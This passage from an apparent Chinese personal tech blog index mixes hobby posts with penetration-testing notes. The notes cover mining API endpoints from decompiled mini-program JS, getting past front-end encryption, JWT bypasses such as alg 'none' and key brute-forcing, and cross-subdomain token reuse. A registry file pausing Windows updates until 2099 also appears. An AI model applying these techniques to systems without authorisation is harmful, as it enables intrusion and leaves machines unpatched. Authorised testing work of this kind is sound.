<li>根据用户反馈不断更新和优化模型，增加方言样本，优化模型结构。</li>
<li>定期更新训练数据，确保模型的准确性和鲁棒性。</li>
</ul>
<hr>
<p><strong>注意事项：</strong></p>
<ul>
<li>方言识别的难点之一是口音和发音差异，因此训练数据必须具备多样性。</li>
<li>端到端训练是一个计算密集型过程，训练时需要高效的硬件支持（如 GPU）。</li>
<li>可以考虑使用 <strong>迁移学习</strong>，利用已有的大规模语音识别模型进行微调，以加速训练过程。</li>
</ul>
]]></content>
      <categories>
        <category>machine-learning</category>
      </categories>
      <tags>
        <tag>数据集</tag>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows注册表防更新</title>
    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows update</tag>
      </tags>
  </entry>
  <entry>
    <title>主页和api</title>
    <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
    <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
<p>1、主页由其子域名显示，其他功能显示皆由该子域名指向，xxx#&#x2F;page&#x2F;xxx</p>
<p>2、其信息由专门的api子域名来传回，有时会有sms子域名用作短信的发送</p>
<p>3、若没有登录，部分功能的显示可以显示，但无实际信息，即，空白，json为{}</p>
<span id="more"></span>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1.页面和小程序反编译爬取出的js文件或者json文件通常会有上述两个子域名的指向&#x2F;接口</p>
<p>2.找到指向&#x2F;接口，能够查看页面的功能以及接口的作用，用作于测试接口</p>
<p>3.通常会有登录接口用作返回token，大概率为jwt</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.有些网址不登录，后台的接口，以及其他的接口无法查看，只能看到个登录接口，即后续网址接口信息需要后台返回，但不代表不存在，通常即使是一个服务器其功能和作用都会十分广泛，毕竟好的服务器很贵的。</p>
<p>—&gt;所以可以从多方入手，例如：该子域名的其他小程序，该接口子域名是否存在被其他网址或小程序被调用的可能</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.web需要登录就找它对应的小程序，一般来说小程序一旦授权就会给合法jwt</p>
<p>2.用jwt深度爬取js，就是哪里能点点哪里，都点一遍，然后把js脚本下下来，分析指向#&#x2F;xxx&#x2F;和api</p>
<p>3.看有无越权，逻辑漏洞，版本泄露，路径泄露和框架泄露等等</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>认真分析一个事物就会形成一条思路明显的线路，整体的框架和内容就会完整，认真很久了还没思路那就去睡觉</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞库</title>
    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>自动追番网址</title>
    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
<span id="more"></span>

<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
<hr>
<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
]]></content>
      <categories>
        <category>anime</category>
      </categories>
      <tags>
        <tag>rss</tag>
        <tag>qBitTorrent</tag>
        <tag>Two-dimensional</tag>
      </tags>
  </entry>
  <entry>
    <title>正则匹配脚本</title>
    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
<p>顺便记录一下排查api的正则</p>
<span id="more"></span>

<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
<h1 id="正则记录"><a href="#正则记录" class="headerlink" title="正则记录"></a>正则记录</h1><h3 id="以method为特征值"><a href="#以method为特征值" class="headerlink" title="以method为特征值"></a>以method为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 跑出 api 的个数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method\s*:\s*&quot;(post|get)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="以path为特征值"><a href="#以path为特征值" class="headerlink" title="以path为特征值"></a>以path为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 尽可能跑出 api 以及虚拟页面的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义匹配的正则表达式和分类标签</span><br><span class="line">	含重复的正则</span><br><span class="line">pattern_groups = &#123;</span><br><span class="line">    &quot;PagePath Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;Path Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]:\s*&quot;([^&quot;]+)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]: &quot;([^&quot;]+)&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;GET Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Gg][Ee][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ],</span><br><span class="line">    &quot;POST Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Oo][Ss][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="以特殊符号为特征值"><a href="#以特殊符号为特征值" class="headerlink" title="以特殊符号为特征值"></a>以特殊符号为特征值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 匹配完整 URL（含协议或协议相对）</span><br><span class="line">(?:&quot;|&#x27;)                              # 起始引号（单引号或双引号）</span><br><span class="line">((?:[a-zA-Z]&#123;1,10&#125;://|//)            # 协议：例如 http://、https://、ftp:// 或协议相对 //</span><br><span class="line">[^&quot;&#x27;/]&#123;1,&#125;\.                         # 主域名（不含引号或斜线）+ 点</span><br><span class="line">[a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)               # 顶级域名后缀（如 com/net）+ 可选路径</span><br><span class="line">(?:&quot;|&#x27;)                              # 结束引号</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;https://example.com/path&quot; 或 &#x27;//cdn.xxx.com&#x27; 的完整 URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 匹配相对路径（以 /、../ 或 ./ 开头）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">((?:/|\.\./|\./)                     # 以 /、../ 或 ./ 开头</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]]           # 第一个字符不能为特殊符号</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)                    # 后续字符为路径</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;/api/user&quot;、&quot;../img/pic.png&quot; 的相对路径链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 匹配目录+资源文件（如 action、js、png）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/]&#123;1,&#125;/                # 至少一个目录名 + 斜杠</span><br><span class="line">[a-zA-Z0-9_\-/]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:[a-zA-Z]&#123;1,4&#125;|action)           # 文件后缀（如 .js/.css/.action）</span><br><span class="line">(?:[\?|/][^&quot;&#x27; ]&#123;0,&#125;|))               # 可选参数或路径，如 ?id=1</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;admin/login.action&quot;、&quot;static/app.js?v=1&quot; 的接口或资源路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 匹配单文件名 + 参数（如 login.php?id=1）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:php|asp|aspx|jsp|json|          # 特定后缀（可扩展）</span><br><span class="line">action|html|js|txt|xml)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))                    # 可选参数</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;index.php?id=1&quot;、&quot;test.jsp&quot; 的单独接口文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 5. 匹配 .do/.cgi/.py 等其他接口风格</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/.]&#123;1,&#125;</span><br><span class="line">\.(?:do|cgi|py|rb|go)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取 &quot;.do&quot;、&quot;.cgi&quot;、&quot;.py&quot; 等扩展名接口（例如 WebLogic、老系统常见）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h1><p><a href="https://github.com/cliayn/bp_py_regular-expressions">bp插件</a></p>
<p><a href="https://github.com/cliayn/re_js_api-dir">api脚本</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jython</tag>
        <tag>Burp Suite</tag>
      </tags>
  </entry>
  <entry>
    <title>web和小程序的漏洞排查</title>
    <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
    <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="过前端加密"><a href="#过前端加密" class="headerlink" title="过前端加密"></a>过前端加密</h3><p>​	在web端或者小程序中可能遇到请求包中的参数加密的情况，这种加密我一般用下面的两种处理方式。</p>
<span id="more"></span>

<h6 id="1、在js中找加密和解密算法"><a href="#1、在js中找加密和解密算法" class="headerlink" title="1、在js中找加密和解密算法"></a>1、在js中找加密和解密算法</h6><p>​		—如果是自定义算法你可中大奖了，你得解算法</p>
<p>​		—&gt;适用于简单的、有框架可套的算法，例如：AES、DES、RSA-酌情考虑</p>
<p>​		1&gt;主要是排查js代码中的加密函数和解密函数，小程序的话需要用工具调出控制台进行调试</p>
<p>​		2&gt;排查的函数通常为encrypt、decrypt函数，简单的直接在源代码处ctrl+f找这两单词就行，复杂的需要交数据前暂停执行进行调试，可能有点抽象，给个图就好了</p>
<p><img src="/../image/note_24_12/1_1-2.jpg" alt="1_1-2"></p>
<p>​		3&gt;复杂的需要一步步找，一般是小程序需要调试，步骤如下：</p>
<p>​			（1）、暂停执行</p>
<p>​			（2）、输入框中输入数据</p>
<p>​			（3）、点下一步，或者下一个函数</p>
<p>​			（4）、等监视的数据突然加密了，就记下那个函数分析</p>
<p>​			（5）、主要找加密算法是什么、iv和key，自定义算法和国密那些就用第二个方法吧</p>
<p>​	小程序需要用工具调出，工具推荐如下：</p>
<p>​			①、<a href="https://github.com/eeeeeeeeee-code/e0e1-wx">windows_自动化反编译</a> </p>
<p>​			②、<a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python/releases/">WeChatOpenDevTools-Python</a> </p>
<h6 id="2、在控制台中定义函数直接输入数据"><a href="#2、在控制台中定义函数直接输入数据" class="headerlink" title="2、在控制台中定义函数直接输入数据"></a>2、在控制台中定义函数直接输入数据</h6><p>​		1&gt;这个如果处理的好，在web端基本可以直接无需理会加密</p>
<p>​			—&gt;需要比较熟练的使用python或者其他的代码，但是，熟练使用ai也行</p>
<p>​		2&gt;有篇文章讲的很细，如下：</p>
<p>​			—&gt;<a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmEr8RpQcC1aoD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a> </p>
<h6 id="3、other"><a href="#3、other" class="headerlink" title="3、other"></a>3、other</h6><p>​	—&gt;在应用软件中去壳逆向分析伪代码</p>
<h3 id="jwt-api问题"><a href="#jwt-api问题" class="headerlink" title="jwt_api问题"></a>jwt_api问题</h3><p>​	我见识现在不多，有错误的地方，想起来了就回来改一下，没有想起来就错下去喽。</p>
<p>​	jwt身份验证，一般情况不会给人伪造为空或者爆破出来密钥的机会，对我们有利的地方是通过正规途径获得一个合法的jwt后他们的接口通常不会有过多的权限管理，人话就是越权，逻辑洞可能比较多</p>
<h6 id="1、尝试jwt绕过"><a href="#1、尝试jwt绕过" class="headerlink" title="1、尝试jwt绕过"></a>1、尝试jwt绕过</h6><h6 id="—-生产环境没成功过"><a href="#—-生产环境没成功过" class="headerlink" title="—&gt;生产环境没成功过"></a>—&gt;生产环境没成功过</h6><p>在渗透测试中，可以尝试以下几种JWT绕过方法—没有也要试试，成功就爽了</p>
<p>​	1&gt;<strong>修改JWT令牌</strong>：通过修改JWT的Payload部分，可以尝试提升权限。例如，将用户角色从普通用户修改为管理员<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
<p>​	2&gt;<strong>利用过期令牌</strong>：有时即使JWT令牌已过期，服务器端可能仍然接受该令牌。通过修改令牌中的<em>exp</em>（过期时间）字段，可以尝试让过期令牌重新生效<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	3&gt;<strong>历史令牌伪造</strong>：如果能够获取到历史JWT令牌，可以尝试修改其中的<em>iat</em>（签发时间）和<em>exp</em>字段，使其看起来像是新签发的令牌<a href="https://blog.csdn.net/weixin_51559599/article/details/134860478">3</a>。</p>
<p>​	4&gt;<strong>算法混淆</strong>：JWT头部中的<em>alg</em>字段指定了签名算法。如果服务器端没有正确验证该字段，可以尝试将其修改为<em>none</em>，绕过签名验证<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
<p>​	5&gt;<strong>密钥爆破</strong>：如果服务器使用了弱密钥，可以尝试使用密钥字典进行爆破，获取用于签名的密钥<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	6&gt;<strong>SQL注入绕过key</strong>：在某些情况下，如果JWT令牌中包含SQL注入漏洞，可以通过注入攻击绕过密钥验证<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<h6 id="2、利用jwt"><a href="#2、利用jwt" class="headerlink" title="2、利用jwt"></a>2、利用jwt</h6><h6 id="—-找api看越权"><a href="#—-找api看越权" class="headerlink" title="—&gt;找api看越权"></a>—&gt;找api看越权</h6><p>​	拿小程序来说，一般会直接给你一个jwt，这个jwt在服务器里面没有绑定任何用户，里面一般会有一个类似于openid的存在，当然有些要你注册或者登录才会响应一个jwt或者token</p>
<p>​	1&gt;将小程序反编译出来的代码进行分析整理，可以用我上面给的自动化反编译的那个软件，主要整理出接口和网址</p>
<p>​	2&gt;有接口就直接爆GET、POST、PUT、HEAD、TRACE等（生产环境没事别爆delete，爆成功等死）分析响应包，很明显的，一般就几种响应，要么200，要么权限不足，要么返回数据，要么说你类型错误，当然还有给你拉小黑屋的</p>
<p>​	3&gt;有响应就分析操作；该方法主要是找api，不一定只有反编译的js里有，其本身小程序也是前端，可以尝试更改响应包跑前端的接口</p>
<h6 id="—-同一域名使用"><a href="#—-同一域名使用" class="headerlink" title="—&gt;同一域名使用"></a>—&gt;同一域名使用</h6><p>​	拿网址举例，123.123.com的合法jwt，或许是可以到111.123.com的网址使用的，也就是说，如果你一个网址没有权限，可以先尝试去找一样域名的其他网址去注册一个合法用户，获得jwt后尝试直接使用该网址的功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>js</tag>
        <tag>Cybersecurity</tag>
        <tag>jwt</tag>
        <tag>keys</tag>
      </tags>
  </entry>
  <entry>
    <title>智能桌宠</title>
    <url>/2024/12/18/%E6%99%BA%E8%83%BD%E6%A1%8C%E9%9D%A2%E5%AE%A0%E7%89%A9/</url>
    <content><![CDATA[<p>该文章为尝试进行智能桌宠的搭建前记录的相关流程和笔记，以免自己行动时步骤不对直接爆炸；</p>
<h2 id="教程视频"><a href="#教程视频" class="headerlink" title="教程视频"></a>教程视频</h2><p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc">STM32智能桌面宠物总教程_哔哩哔哩_bilibili</a>	该视频为搭建桌宠的教程</p>
<p>​	总计花费3.6元购买了总材料</p>
<h3 id="视频步骤"><a href="#视频步骤" class="headerlink" title="视频步骤"></a>视频步骤</h3><span id="more"></span>

<h5 id="嘉立创下单PCB和3D打印"><a href="#嘉立创下单PCB和3D打印" class="headerlink" title="嘉立创下单PCB和3D打印"></a>嘉立创下单PCB和3D打印</h5><p>​		—&gt;用他的模板，导出文件后去领卷买东西</p>
<p>​		（1）、<a href="https://pro.lceda.cn/">构建单片机的软件</a>	可有可无</p>
<p>​		（2）、<a href="https://www.jlc.com/portal/appDownloadsWithConfig.html">嘉立创PCB下单</a></p>
<p><img src="/../image/Smart_table_pets/buy_pcb.png"></p>
<p>​			后面下单参数太多懒得截图：</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=390">STM32智能桌面-跳转到第390秒</a></p>
<p>​			哔哩哔哩把跳转参数关了的话就是该教程的6:30分处</p>
<p>​			（3）、嘉立创3D打印下单</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=461">STM32智能桌面-跳转到第7:41</a></p>
<h5 id="焊接"><a href="#焊接" class="headerlink" title="焊接"></a>焊接</h5><h6 id="1-焊接视频"><a href="#1-焊接视频" class="headerlink" title="1&gt;焊接视频"></a>1&gt;焊接视频</h6><p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=481">STM32智能桌面-跳转到第8:01</a></p>
<p>​		（1）、焊接开关</p>
<p>​			—&gt;焊接开关时，一定要先焊接开关左侧的</p>
<p>​			—&gt;先上锡固定开关左侧一角，然后直接焊其他角</p>
<p><img src="/../image/Smart_table_pets/Welding_switches.jpg" alt="焊接开关后成品"></p>
<p>​		（2）、焊接电阻、LED灯</p>
<p>​			—&gt;LED反面有箭头，必须保证箭头朝上</p>
<p>​			然后在电阻的右侧焊接AMS芯片</p>
<p>​					(c1、c2全是电容)</p>
<p>​			可以用锂电池进行测试—确保开关已拨通</p>
<p><img src="/../image/Smart_table_pets/hj_1-2.jpg"></p>
<p>​		（3）、焊接电容</p>
<p>​			—&gt;C1为10UF、C2为100NF</p>
<p>​			<img src="/../image/Smart_table_pets/Soldering_capacitors.jpg"></p>
<p><img src="/../image/Smart_table_pets/Soldering_capacitors2.jpg"></p>
<p>​			—&gt;当然右侧开关那还有一堆电容</p>
<p>​		（4）、焊接电源排针</p>
<p><img src="/../image/Smart_table_pets/hj_1-4.jpg"></p>
<p>​		（5）、焊接1X20P的排母</p>
<p>​			—&gt;只需要焊接两部分，即开头、结尾两行：</p>
<p><img src="/../image/Smart_table_pets/hj_1-5.jpg"></p>
<p>​			<img src="/../image/Smart_table_pets/hj_1-5_2.jpg"></p>
<p>​			—&gt;单片机的两种选择{<a href="%E6%8E%92%E9%92%88%E8%BF%87%E9%95%BF%E4%BC%9A%E5%8E%8B%E5%88%B0%E4%B8%8B%E9%9D%A2%E7%9A%84%E7%94%B5%E6%B1%A0">焊接好排针的</a>、[直接带排针的]、<a href="%E8%80%83%E9%AA%8C%E7%84%8A%E6%8E%A5%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E9%80%890%EF%BC%8C%E7%84%B6%E5%90%8E%E5%89%AA%E6%8E%89%E9%95%BF%E7%9A%84">不焊接排针的</a>}</p>
<p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=815">STM32智能桌面-跳转到第13:35</a>  —不焊接排查麻烦但可以避免压到电池和语音模块不好插上</p>
<p>​		（6）、焊接XH直针</p>
<p>​		—&gt;右上角焊接XH直针     &#x2F;&#x2F;语音模块的咪头和喇叭处也是</p>
<p>​		—&gt;语音模块焊接排针</p>
<h6 id="2-其余相关注意事项"><a href="#2-其余相关注意事项" class="headerlink" title="2&gt;其余相关注意事项"></a>2&gt;其余相关注意事项</h6><p>​		（1）、锂电池的正负极分别充放电模块的B+和B</p>
<p>​		（2）、输出电源线要接好—是焊接到模块中央位置两侧：</p>
<p><img src="/../image/Smart_table_pets/zy_2-2.jpg"></p>
<p>​		（3）、喇叭没有正负，味头上有三条线的是负极</p>
<h6 id="3-程序"><a href="#3-程序" class="headerlink" title="3&gt;程序"></a>3&gt;程序</h6><p>​		（1）、串口下载单片机程序</p>
<p>​			—&gt;使用前需要安装CH340的环境驱动</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=900">STM32智能桌面-跳转到第15:00</a> </p>
<p>​		（2）、接线部分</p>
<p>​			接线—接线烧录 &#x2F; CH340</p>
<p>​			—&gt;使用前拔跳线帽</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=941">STM32智能桌面-跳转到第15:41</a> </p>
<p>​		（3）、烧录语音部分</p>
<p>​			—&gt;点击烧录后，需要拔5V线等两秒再接上去</p>
<p>​			</p>
<h6 id="4-组装"><a href="#4-组装" class="headerlink" title="4&gt;组装"></a>4&gt;组装</h6><p>​		（1）、模型组装</p>
<p>​			—&gt;考验手工了，前面都完成了，这里应该没什么问题了</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1114">STM32智能桌面-跳转到第18:34</a></p>
<p>​			—&gt;用面包板线将OLED的排母与做成的排母相连时，要看好你OLED屏幕左侧是GND还是VCC</p>
<p>​		（2）、排线</p>
<p>​			—&gt;太长了剪掉重新接应该也可以</p>
<h6 id="5-语音网站配置"><a href="#5-语音网站配置" class="headerlink" title="5&gt;语音网站配置"></a>5&gt;语音网站配置</h6><p>​		（1）、智能公元网址</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1640">STM32智能桌面-跳转到第27:20</a></p>
<p>​		（2）、代码逻辑</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1860">STM32智能桌面-跳转到第31:00</a></p>
<p>结束语：此篇文章为制作前的准备，如果爆炸了不想做了与我无关</p>
]]></content>
      <categories>
        <category>microcontroller</category>
      </categories>
      <tags>
        <tag>单片机</tag>
        <tag>狗</tag>
        <tag>三次元</tag>
      </tags>
  </entry>
  <entry>
    <title>做测试要准备的工具</title>
    <url>/2025/10/10/%E5%81%9A%E6%B5%8B%E8%AF%95%E8%A6%81%E5%87%86%E5%A4%87%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>因为内网环境老是需要准备工具，记录一份简易的工具列表</p>
<span id="more"></span>

<h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1-工具"></a>1-工具</h1><p>抓包工具（简单配置）</p>
<p>bp（yakit、mitm）</p>
<p>插件-</p>
<p>JsRouteScan、HaE（config.yml）、RouteVulScan（config.yaml）、fastjson、fakeip、xiazhu</p>
<p>目录、正则、遍历、框架、ip</p>
<p>python环境(包含依赖)：</p>
<p>.zip&#x2F;.dir&#x3D;&#x3D;&gt;dirsearch.py(更新目录)&lt;&#x3D;&#x3D;spring-boot</p>
]]></content>
      <categories>
        <category>move-tool</category>
      </categories>
      <tags>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>n2n实操内网通信</title>
    <url>/2025/09/04/n2n%E5%AE%9E%E6%93%8D%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1/</url>
